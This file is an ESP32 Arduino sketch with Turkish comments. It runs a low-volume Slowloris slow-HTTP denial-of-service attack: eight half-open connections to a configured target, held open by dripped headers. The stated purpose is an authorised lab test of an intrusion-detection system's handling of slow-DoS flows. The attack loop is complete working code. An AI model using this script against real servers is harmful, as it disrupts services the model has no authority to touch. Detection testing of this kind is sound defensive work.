// ============================================================================
//  esp32_slowloris.ino  --  CICIDS SINIFI: DoS-slow (Slowloris / Slowhttptest)
// ============================================================================
//  YETKI: SADECE sana ait, ayni yerel LAN'daki Windows IDS makinesine karsi,
//  kontrollu/yetkilendirilmis dogrulama testi icindir.
//
//  ONEMLI GERCEKCILIK NOTU (Pi -c1000 / -c150 karsilastirmasi):
//    Slowloris'in ETKISI cok sayida eszamanli yari-acik baglantiya dayanir.
//    Pi plani -c1000 (volumetrik) ve -c150 (davranissal, F4) kullaniyordu.
//    ESP32 BUNLARA TEK BASINA ULASAMAZ: lwIP eszamanli soket sayisi tipik
//    CONFIG_LWIP_MAX_SOCKETS = 10..16 ile SINIRLI. Yani:
//      * -c1000 / -c150 (VOLUMETRIK "Baglanti Seli", conn_flood>=200) ESP32
//        ile GERCEKCI DEGIL -- o senaryoyu ESP32 ile kurmaya CALISMA. O taraf
//        icin esp32_connflood.ino (ardisik connect seli) zaten volumetrik
//        alarmi tetikliyor.
//      * Bu sketch NUM_SOCKETS (varsayilan 8, ~12'ye kadar denenebilir) kadar
//        eszamanli baglanti acip her birine YARIM HTTP istegi gonderir ve
//        periyodik olarak birer baslik satiri damlatarak baglantilari ACIK
//        TUTAR. 8 baglanti conn_flood esiginin (200) COK ALTINDA kalir ->
//        akislar NON-VOLUMETRIK / LSTM+Counter dalina duser.
//
//  BU YUZDEN BU SKETCH'IN DEGERI: dusuk-hacimli ama GERCEK yavas-DoS akis
//  DAVRANISI uretir (uzun IAT, tamamlanmamis istek). Boylece F4'un asil
//  sordugu seyi -- R21 IAT-kapisi / immature-clamp / R26 konsey vetosunun
//  GERCEK bir yavas-DoS akisini yanlislikla bastirip bastirmadigini -- PER-FLOW
//  duzeyde sinar. Uyari: yalnizca ~8 akis oldugu icin sinyal zayiftir; alarm
//  cikmamasi "bastirildi" degil "hacim yetersiz" de olabilir. Mongo'da tek tek
//  bu akislarin suppressed_by / status / ood_distance alanlarina bak.
//
//  ARDUINO IDE: Board = "ESP32 Dev Module". Ek kutuphane gerekmez. 115200.
// ============================================================================

#include <WiFi.h>
#include "secrets.h"   // local, not in git: copy secrets.example.h

// ----- DUZENLENEBILIR DEGISKENLER -------------------------------------------
const char* WIFI_SSID = SECRET_WIFI_SSID;   // set in secrets.h
const char* WIFI_PASS = SECRET_WIFI_PASS;   // set in secrets.h
IPAddress   TARGET_IP(SECRET_TARGET_IP);    // set in secrets.h (IDS machine LAN IP)

const uint16_t TARGET_PORT   = 8080;       // hedef http.server portu
const int      NUM_SOCKETS   = 8;          // eszamanli baglanti (ESP32 siniri ~10-16; 8 guvenli)
const uint32_t HOLD_SECONDS  = 120;        // baglantilari kac saniye acik tut
const uint32_t KEEPALIVE_MS  = 10000;      // her baglantiya kac ms'de bir "damla" baslik gonder
// ----------------------------------------------------------------------------

WiFiClient clients[NUM_SOCKETS];

void connectWiFi() {
  Serial.printf("[WiFi] '%s' agina baglaniliyor", WIFI_SSID);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) { delay(400); Serial.print("."); }
  Serial.printf("\n[WiFi] Baglandi. ESP32 IP = %s\n", WiFi.localIP().toString().c_str());
  Serial.println("[i] Bu IP'yi 04_mongo_analysis.py --attacker-ip degerine yaz.");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n============================================================");
  Serial.println(" ESP32 CANLI-ATES -- CICIDS DoS-slow (Slowloris, dusuk-hacim)");
  Serial.println("============================================================");
  Serial.printf(" HEDEF        : %s:%u\n", TARGET_IP.toString().c_str(), TARGET_PORT);
  Serial.printf(" ESZAMANLI    : %d baglanti  (conn_flood=200 esiginin COK altinda)\n", NUM_SOCKETS);
  Serial.printf(" ACIK TUTMA   : %u sn, her %u ms'de bir damla baslik\n",
                (unsigned)HOLD_SECONDS, (unsigned)KEEPALIVE_MS);
  Serial.println(" AMAC         : NON-VOLUMETRIK / LSTM dalinda yavas-DoS DAVRANISI (F4).");
  Serial.println(" YETKI        : yalnizca sana ait hedef, yetkili lab testi.");
  Serial.println("------------------------------------------------------------");

  connectWiFi();

  // 1) Tum baglantilari ac ve YARIM (bitmemis) HTTP istegi gonder.
  int opened = 0;
  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (clients[i].connect(TARGET_IP, TARGET_PORT, 1000)) {
      // Kasitli: son \r\n\r\n YOK -> sunucu istegi tamamlanmis saymaz, bekler.
      clients[i].print("GET /?slow=");
      clients[i].print(i);
      clients[i].print(" HTTP/1.1\r\nHost: ");
      clients[i].print(TARGET_IP.toString());
      clients[i].print("\r\nUser-Agent: esp32-slow-test\r\n");
      opened++;
    } else {
      Serial.printf("  [!] baglanti %d kurulamadi\n", i);
    }
    delay(150);
  }
  Serial.printf("[>>>] %d/%d yavas baglanti acildi, acik tutuluyor...\n", opened, NUM_SOCKETS);

  // 2) HOLD_SECONDS boyunca periyodik "damla" baslik gonderip acik tut.
  uint32_t startMs = millis();
  uint32_t lastDrip = 0;
  while (millis() - startMs < HOLD_SECONDS * 1000UL) {
    if (millis() - lastDrip >= KEEPALIVE_MS) {
      lastDrip = millis();
      int alive = 0;
      for (int i = 0; i < NUM_SOCKETS; i++) {
        if (clients[i].connected()) {
          // Tamamlanmamis fazladan baslik -> istek asla bitmez, baglanti yasar.
          clients[i].print("X-a: b\r\n");
          alive++;
        }
      }
      Serial.printf("  ... damla gonderildi, canli baglanti: %d  (gecen %lus)\n",
                    alive, (unsigned long)((millis() - startMs) / 1000));
    }
    delay(200);
  }

  // 3) Temizlik.
  for (int i = 0; i < NUM_SOCKETS; i++) clients[i].stop();
  Serial.println("\n============================================================");
  Serial.println(" YAVAS-DoS BITTI. Mongo'da bu akislar (ESP32 IP, dst:port) icin:");
  Serial.println("  status / suppressed_by / ood_distance alanlarina TEK TEK bak.");
  Serial.println("  suppressed_by={committee_dissent|ood|immature_flow} + status!=ATTACK");
  Serial.println("  = gercek yavas-DoS akisi yanlislikla bastirildi (asil F4 bulgusu).");
  Serial.println("  Alarm yoksa: dusuk hacim (~8 akis) da neden olabilir, kesin degil.");
  Serial.println("============================================================");
}

void loop() {
  delay(10000);  // tek seferlik; tekrar icin RESET.
}
